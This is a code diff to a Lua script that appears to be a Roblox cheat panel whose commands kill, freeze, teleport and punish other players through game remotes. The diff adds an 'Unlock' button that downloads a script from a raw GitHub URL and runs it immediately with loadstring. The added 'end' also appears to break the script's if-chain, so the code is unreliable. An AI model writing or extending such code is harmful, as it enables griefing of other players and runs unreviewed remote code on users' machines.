@@ -349,7 +349,9 @@ local function executeCommand(command)
                 ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsUnfreeze))
                 punishBlacklist[userId] = true
             end
-
+        elseif command == "Unlock" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/main/Unlocker%201.0", true))()
+end
         elseif command == "noclans" then
             local player = LocalPlayer
             local Remote = ReplicatedStorage:WaitForChild("SS_Comunication"):WaitForChild("RemoveMember")
@@ -415,7 +417,7 @@ end
 -------------------------------------------------------------------
 -- Crear botones (sin tg y sk, con noclans)
 -------------------------------------------------------------------
-local commands = {"bring","kill","heal","punish","unpunish","freeze","unfreeze","to","b1","hk","frm","permGod","Killer","noclans"}
+local commands = {"bring","kill","heal","punish","unpunish","freeze","unfreeze","to","b1","hk","noclans","permGod","Killer", "Unlock", "frm"}
 for _, cmd in ipairs(commands) do
     local button = Instance.new("TextButton")
     button.BackgroundColor3 = Color3.fromRGB(230,230,230)
